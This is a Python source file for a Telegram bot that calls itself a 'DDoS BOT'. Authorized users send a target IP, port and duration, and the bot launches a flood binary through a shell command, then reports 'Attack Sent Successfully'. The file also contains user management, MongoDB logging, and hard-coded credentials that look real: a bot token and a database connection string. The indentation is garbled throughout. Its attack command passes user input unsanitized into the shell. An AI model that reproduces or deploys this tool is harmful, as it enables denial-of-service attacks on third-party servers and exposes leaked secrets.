import telebot
import subprocess
import requests
import datetime
import os
from pymongo import MongoClient

# insert your Telegram bot token here
bot = telebot.TeleBot('7893115895:AAEisWxEs-2ACLZqgFtsx9w0Ws459mC3Oio')

# MongoDB connection
client = MongoClient('mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv')  # Adjust the URI as needed
db = client['rishi']  # Database Name
user_collection = db['rishi']  # Collection for users
log_collection = db['logs']  # Collection for logs

# Admin user IDs
admin_id = ["5816048581"]

# Function to read allowed user IDs from the MongoDB
def read_users():
    users = user_collection.find()
        return [str(user['_id']) for user in users]
# Function to log command to the MongoDB
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
        if user_info.username:
                username = "@" + user_info.username
                    else:
                            username = f"UserID: {user_id}"
    log_entry = {
            'username': username,
                    'target': target,
                            'port': port,
                                    'time': time,
                                            'timestamp': datetime.datetime.now()
                                                }
                                                    log_collection.insert_one(log_entry)
# Function to clear logs from MongoDB
def clear_logs():
    result = log_collection.delete_many({})
        if result.deleted_count > 0:
                return "Logs cleared successfully ✅"
                    else:
                            return "No data found ❌"
# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = {
            'user_id': user_id,
                    'command': command,
                            'target': target,
                                    'port': port,
                                            'time': time,
                                                    'timestamp': datetime.datetime.now()
                                                        }
                                                            log_collection.insert_one(log_entry)
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
        if user_id in admin_id:
                command = message.text.split()
                        if len(command) > 1:
                                    user_to_add = command[1]
                                                if user_collection.find_one({"_id": user_to_add}) is None:
                                                                user_collection.insert_one({"_id": user_to_add})
                                                                                response = f"User {user_to_add} Added Successfully"
                                                                                            else:
                                                                                                            response = "User already exists"
                                                                                                                    else:
                                                                                                                                response = "Please specify user to add"
                                                                                                                                    else:
                                                                                                                                            response = "💢 ONLY ADMIN CAN USE THIS COMMAND 💢"
    bot.reply_to(message, response)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
        if user_id in admin_id:
                command = message.text.split()
                        if len(command) > 1:
                                    user_to_remove = command[1]
                                                if user_collection.find_one({"_id": user_to_remove}) is not None:
                                                                user_collection.delete_one({"_id": user_to_remove})
                                                                                response = f"User {user_to_remove} Removed ✔️"
                                                                                            else:
                                                                                                            response = f"User {user_to_remove} not found"
                                                                                                                    else:
                                                                                                                                response = 'Specify user ID to remove'
                                                                                                                                    else:
                                                                                                                                            response = "💢 ONLY ADMIN CAN USE THIS COMMAND 💢"
    bot.reply_to(message, response)
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
        if user_id in admin_id:
                result = clear_logs()
                        bot.reply_to(message, result)
                            else:
                                    response = "💢 ONLY ADMIN CAN USE THIS COMMAND 💢"
                                            bot.reply_to(message, response)
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
        if user_id in admin_id:
                users = read_users()
                        if users:
                                    response = "Authorized Users:\n" + "\n".join(f"- {user_id}" for user_id in users)
                                            else:
                                                        response = "No data found ❌"
                                                            else:
                                                                    response = "💢 ONLY ADMIN CAN USE THIS COMMAND 💢"
                                                                        bot.reply_to(message, response)
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
        response = f"Your ID: {user_id}"
            bot.reply_to(message, response)
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
    response = (
            f"🚀 Attack Sent Successfully! 🚀\n\n"
                    f"Target: {target}\nAttack Time: {time} Seconds\nAttacker Name: @{username}\n"
                        )
                            bot.reply_to(message, response)
bgmi_cooldown = {}

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
        if user_id in read_users():
                if user_id not in admin_id:
                            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                                            response = "❕Cooldown in effect, please wait❕"
                                                            bot.reply_to(message, response)
                                                                            return
                                                                                        bgmi_cooldown[user_id] = datetime.datetime.now()
        command = message.text.split()
                if len(command) == 4:
                            target = command[1]
                                        port = int(command[2])
                                                    time = int(command[3])
                                                                if time > 381:
                                                                                response = "❗️Error: use less than 380 seconds❗️"
                                                                                            else:
                                                                                                            record_command_logs(user_id, '/bgmi', target, port, time)
                                                                                                                            log_command(user_id, target, port, time)
                                                                                                                                            start_attack_reply(message, target, port, time)
                                                                                                                                                            full_command = f"./megoxer {target} {port} {time}"
                                                                                                                                                                            subprocess.run(full_command, shell=True)
                                                                                                                                                                                            response = "Attack completed ✅"
                                                                                                                                                                                                    else:
                                                                                                                                                                                                                response = "Enter the target IP, port, and duration in seconds separated by spaces."
                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                            response = "Unauthorized access!"
    bot.reply_to(message, response)
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
        if user_id in read_users():
                user_logs = log_collection.find({"user_id": user_id})
                        if user_logs:
                                    response = "Your Command Logs:\n" + "\n".join(
                                                    f"UserID: {log['user_id']} | Command: {log['command']} | Time: {log['timestamp']}" for log in user_logs)
                                                            else:
                                                                        response = "No data found ❌"
                                                                            else:
                                                                                    response = "🚫 Unauthorized Access! 🚫"
    bot.reply_to(message, response)
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
        response = f"🔆 WELCOME TO DDoS BOT 🔆"
            bot.reply_to(message, response)
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
        if user_id in admin_id:
                command = message.text.split(maxsplit=1)
                        if len(command) > 1:
                                    message_to_broadcast = command[1]
                                                users = user_collection.find()
                                                            for user in users:
                                                                            try:
                                                                                                bot.send_message(user['_id'], message_to_broadcast)
                                                                                                                except Exception as e:
                                                                                                                                    print(f"Failed to send broadcast message to user {user['_id']}: {str(e)}")
                                                                                                                                                response = "Message sent to all users 👍"
                                                                                                                                                        else:
                                                                                                                                                                    response = "Provide message to send"
                                                                                                                                                                        else:
                                                                                                                                                                                response = "💢 ONLY ADMIN CAN USE THIS COMMAND 💢"
    bot.reply_to(message, response)
# Start polling
if __name__ == '__main__':
    while True:
            try:
                        bot.polling(none_stop=True)
                                except Exception as e:
                                            print(e)